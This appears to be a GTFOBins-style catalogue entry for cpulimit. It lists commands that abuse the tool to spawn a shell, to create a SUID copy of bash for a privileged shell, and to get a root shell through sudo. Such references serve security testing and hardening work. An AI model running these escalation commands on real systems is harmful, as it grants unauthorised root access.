---
functions:
  shell:
    - code: cpulimit -l 100 -f /bin/sh
  suid:
  - code: cpulimit -l 100 -f cp /bin/bash .
  - code: cpulimit -l 100 -f chmod +s bash
  - code: /bash -p
  sudo:
    - code: sudo cpulimit -l 100 -f /bin/sh
---
